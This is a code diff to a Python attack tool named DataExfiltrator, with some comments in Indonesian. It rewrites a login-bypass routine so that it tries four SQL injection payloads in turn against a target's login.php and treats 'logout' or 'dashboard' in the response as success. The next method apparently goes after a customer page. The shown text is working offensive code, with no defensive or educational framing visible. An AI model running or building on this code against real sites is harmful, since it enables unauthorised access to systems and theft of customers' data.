@@ -76,31 +76,29 @@ class DataExfiltrator:
         
         login_url = urljoin(self.target_url, "login.php")
         
-        # Use SQL injection to bypass login
-        payload = {
-            "username": "' OR '1'='1",
-            "password": "anything"
-        }
+        # SQL injection payloads - akan dicoba berurutan sampai sukses
+        sqli_payloads = [
+            {"username": "admin'-- ", "password": "anything"},       # Comment out password check
+            {"username": "' OR '1'='1'-- ", "password": "anything"}, # Always true
+            {"username": "' OR 1=1-- ", "password": "anything"},     # Always true (numeric)
+            {"username": "admin' #", "password": "anything"},        # MySQL comment
+        ]
         
-        try:
-            response = self.session.post(login_url, data=payload, allow_redirects=True, timeout=10)
-            
-            if "dashboard" in response.text.lower() or "logout" in response.text.lower():
-                self.log("[✓] Authentication bypassed successfully!", "success")
-                return True
-            else:
-                # Try with admin username
-                payload = {"username": "admin'--", "password": "x"}
+        for payload in sqli_payloads:
+            try:
+                self.log(f"    Trying: {payload['username']}", "info")
                 response = self.session.post(login_url, data=payload, allow_redirects=True, timeout=10)
                 
-                if "dashboard" in response.text.lower():
-                    self.log("[✓] Authentication bypassed using admin account!", "success")
+                # Cek apakah berhasil login (ada kata logout/dashboard di response)
+                if "logout" in response.text.lower() or "dashboard" in response.text.lower():
+                    self.log(f"[✓] Authentication bypassed with: {payload['username']}", "success")
                     return True
                     
-        except Exception as e:
-            self.log(f"[!] Authentication error: {e}", "error")
+            except Exception as e:
+                self.log(f"    Error: {e}", "error")
+                continue
         
-        self.log("[-] Authentication bypass failed. Trying direct access...", "warning")
+        self.log("[-] All SQL injection payloads failed", "warning")
         return False
     
     def access_customer_page(self):
